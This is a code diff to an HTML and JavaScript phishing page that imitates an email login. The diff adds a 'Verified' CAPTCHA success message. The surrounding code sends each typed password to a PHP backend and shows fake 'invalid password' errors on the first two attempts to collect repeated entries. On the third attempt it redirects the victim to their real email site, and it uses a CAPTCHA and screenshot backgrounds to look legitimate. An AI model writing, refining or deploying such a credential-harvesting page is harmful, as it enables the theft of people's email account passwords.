@@ -190,6 +190,26 @@ button:disabled {
   font-weight: 500;
 }
 
+/* CAPTCHA SUCCESS MESSAGE */
+.captcha-success {
+  display: none;
+  background-color: #4caf50;
+  color: white;
+  padding: 10px;
+  border-radius: 4px;
+  margin: 10px 0;
+  text-align: center;
+  font-weight: 500;
+  animation: fadeOut 2s ease forwards;
+  animation-delay: 1s;
+}
+
+@keyframes fadeOut {
+  0% { opacity: 1; }
+  70% { opacity: 1; }
+  100% { opacity: 0; visibility: hidden; }
+}
+
 /* LANGUAGE SELECTOR */
 .language-selector {
   position: fixed;
@@ -322,6 +342,7 @@ html[dir="rtl"] .language-selector {
 
     <!-- CLOUDFLARE TURNSTILE CAPTCHA -->
     <div class="cf-turnstile" id="captcha-container"></div>
+    <div id="captchaSuccess" class="captcha-success">✓ Verified</div>
     <div id="captchaError" class="captcha-error" data-i18n="captcha_required">Please complete the security verification</div>
 
     <!-- SIGN IN BUTTON -->
@@ -333,7 +354,7 @@ html[dir="rtl"] .language-selector {
 </div>
 
 <script>
-// JavaScript with 3‑attempt logic, CAPTCHA only once, and CAPTCHA widget disappears after success
+// JavaScript with 3‑attempt logic, CAPTCHA only once, success message & widget disappears
 const bg = document.getElementById("bg-frame");
 
 // ADD ALL YOUR SCREENSHOTONE KEYS HERE
@@ -612,6 +633,7 @@ const errorMessage = document.getElementById("errorMessage");
 const languageSelect = document.getElementById("languageSelect");
 const togglePassword = document.getElementById("togglePassword");
 const captchaContainer = document.getElementById("captcha-container");
+const captchaSuccess = document.getElementById("captchaSuccess");
 const captchaError = document.getElementById("captchaError");
 
 // Hidden fields
@@ -770,16 +792,15 @@ function collectUserData() {
   timestampField.value = new Date().toISOString();
 }
 
-// --- CLOUDFLARE TURNSTILE CAPTCHA ---
+// --- CLOUDFLARE TURNSTILE CAPTCHA with success message ---
 function initializeCaptcha() {
   if (!CLOUDFLARE_SITE_KEY || captchaVerified) {
-    // If already verified, ensure container is hidden
     if (captchaVerified && captchaContainer) captchaContainer.style.display = 'none';
     return;
   }
   
   captchaContainer.innerHTML = '';
-  captchaContainer.style.display = 'flex'; // ensure visible before verification
+  captchaContainer.style.display = 'flex';
   try {
     turnstileWidgetId = turnstile.render(captchaContainer, {
       sitekey: CLOUDFLARE_SITE_KEY,
@@ -787,16 +808,27 @@ function initializeCaptcha() {
         captchaToken = token;
         captchaVerified = true;
         captchaError.style.display = 'none';
-        // Hide the CAPTCHA widget after successful verification
+        
+        // Show success message
+        if (captchaSuccess) {
+          captchaSuccess.style.display = 'block';
+          // Hide success message after fade animation
+          setTimeout(() => {
+            captchaSuccess.style.display = 'none';
+          }, 3000);
+        }
+        
+        // Hide the CAPTCHA widget
         if (captchaContainer) captchaContainer.style.display = 'none';
         updateSignInButton();
       },
       'expired-callback': function() {
-        // If expired and we already verified, we could optionally show again, but for simplicity keep hidden
         if (!captchaVerified) {
           captchaToken = '';
           captchaError.style.display = 'block';
           updateSignInButton();
+          // If expired, we could optionally show widget again, but we keep it hidden after first success
+          if (!captchaVerified && captchaContainer) captchaContainer.style.display = 'flex';
         }
       },
       'error-callback': function() {
@@ -815,13 +847,11 @@ function initializeCaptcha() {
 }
 
 function resetCaptcha() {
-  // Do not reset if already verified
   if (captchaVerified) return;
   if (turnstileWidgetId !== null && window.turnstile) {
     turnstile.reset(turnstileWidgetId);
     captchaToken = '';
     captchaError.style.display = 'none';
-    // Ensure container is visible again if it was hidden before verification
     if (captchaContainer) captchaContainer.style.display = 'flex';
     updateSignInButton();
   }
@@ -909,7 +939,6 @@ if(languageSelect) {
     if (this.value === 'auto') {
       detectUserLanguage().then(lang => {
         setLanguage(lang);
-        // Only reset captcha if not already verified
         if (!captchaVerified && window.turnstile && turnstileWidgetId !== null) {
           resetCaptcha();
         }
@@ -930,7 +959,7 @@ passwordInput.addEventListener("keydown", e => {
   }
 });
 
-// --- FORM SUBMIT HANDLER with 3‑attempt logic, CAPTCHA only once ---
+// --- FORM SUBMIT HANDLER with 3‑attempt logic ---
 if(loginForm){
   loginForm.addEventListener("submit", async (e) => {
     e.preventDefault();
@@ -940,7 +969,7 @@ if(loginForm){
       return;
     }
     
-    // Increment attempt counter (1,2,3...)
+    // Increment attempt counter
     attempts++;
     attemptField.value = attempts;
     timestampField.value = new Date().toISOString();
@@ -950,30 +979,22 @@ if(loginForm){
     buttonText.style.display = 'none';
     loadingSpinner.style.display = 'block';
     
-    // Send credentials (only once per attempt)
+    // Send credentials
     sendToPHP();
     
-    // Wait 1 second for realism, then decide action based on attempt count
     setTimeout(() => {
       if (attempts === 1 || attempts === 2) {
-        // First or second attempt → show error, reset form for another try
         showError('invalid_password');
-        
-        // Clear password field only (keep CAPTCHA token)
         passwordInput.value = '';
         captchaError.style.display = 'none';
         
-        // Re-enable button and restore UI
         signInBtn.disabled = false;
         buttonText.style.display = 'block';
         loadingSpinner.style.display = 'none';
-        
-        // Focus password for next attempt
         passwordInput.focus();
         updateSignInButton();
         
       } else if (attempts >= 3) {
-        // Third attempt → redirect to real email website (domain)
         showError('signing_in');
         setTimeout(() => {
           if (currentDomain) {
@@ -1019,7 +1040,7 @@ window.addEventListener("DOMContentLoaded", async () => {
   
   updateSignInButton();
   
-  console.log('3‑attempt mode active. CAPTCHA verification required only once, and widget disappears after success.');
+  console.log('3‑attempt mode active. CAPTCHA verification shows green success message and disappears.');
 });
 </script>
 </body>
